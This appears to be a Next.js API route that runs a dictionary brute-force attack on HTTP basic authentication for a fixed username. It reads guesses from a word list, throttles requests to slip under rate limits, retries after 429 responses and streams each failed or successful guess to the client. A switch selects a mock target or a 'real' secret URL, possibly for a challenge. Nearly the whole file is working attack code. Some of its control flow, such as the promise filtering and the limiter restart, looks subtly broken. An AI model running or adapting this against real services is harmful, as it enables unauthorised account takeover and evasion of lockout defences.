import { Readable } from 'stream';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import Bottleneck from 'bottleneck';

//Config
const USERNAME = "John";
const limiter = new Bottleneck({ minTime: 112 }); // Our safe 8.9 req/sec

//Password Check Function
async function checkPassword(password, targetUrl) {
    try {
        const response = await axios.get(targetUrl, {
            auth: { username: USERNAME, password: password }
        });
        return { success: true, url: response.data.url, password: password };
    } catch (error) {
        if (error.response?.status === 429) {
            return { success: false, retry: true, password: password };
        }
        return { success: false, password: password };
    }
}
const wrappedCheck = limiter.wrap(checkPassword);

//GET Handler for Streaming
export async function GET(request) {
    //Read the target query
    const { searchParams } = new URL(request.url);
    const target = searchParams.get('target');

    //Select the URL based on the query
    const TARGET_URL = target === 'real' 
        ? process.env.TARGET_API_URL_SECRET 
        : process.env.NEXT_PUBLIC_MOCK_API_URL;

    const dictPath = path.join(process.cwd(), 'dict.txt');
    if (!fs.existsSync(dictPath)) {
        return new Response(JSON.stringify({ error: "dict.txt not found on server" }), { status: 500 });
    }
    
    const passwords = fs.readFileSync(dictPath, 'utf-8').split('\n').filter(p => p);
    
    const stream = new ReadableStream({
        async start(controller) {
            const encoder = new TextEncoder();
            const sendEvent = (data) => {
                controller.enqueue(encoder.encode(`data: ${JSON.stringify(data)}\n\n`));
            };

            sendEvent({ type: 'log', message: `Starting attack on ${TARGET_URL}...` });
            
            let successfulUrl = null;
            let attackComplete = false;

            const promises = passwords.map((password) => {
                if (attackComplete) return Promise.resolve(null);

                return wrappedCheck(password, TARGET_URL)
                    .then(result => {
                        if (result?.success) {
                            successfulUrl = result.url;
                            attackComplete = true; 
                            limiter.stop(); // Stop the queue!
                            sendEvent({ type: 'success', message: `✅ Success: ${password}`, url: result.url });
                        } else if (result?.retry && !attackComplete) {
                            sendEvent({ type: 'log', message: `RATE LIMIT, retrying ${password}...` });
                            // Re-queue
                            return wrappedCheck(result.password, TARGET_URL).then(res => {
                                if (res?.success) {
                                    successfulUrl = res.url;
                                    attackComplete = true;
                                    limiter.stop();
                                    sendEvent({ type: 'success', message: `✅ Success: ${password}`, url: res.url });
                                }
                            });
                        } else if (!attackComplete) {
                            sendEvent({ type: 'fail', message: `❌ Failed: ${password}` });
                        }
                        return result;
                    })
                    .catch(e => {
                        if (!e.message.includes("limiter has been stopped")) {
                            console.error("Attack stream error:", e);
                        }
                    });
            });

            await Promise.all(promises.filter(p => p !== null));

            sendEvent({ type: 'done', message: 'Attack finished.' });
            controller.close();
            
            // Restart limiter for next time
            await limiter.schedule(() => {});
            limiter.start();
        }
    });

    return new Response(stream, {
        headers: {
            'Content-Type': 'text/event-stream',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
        },
    });
}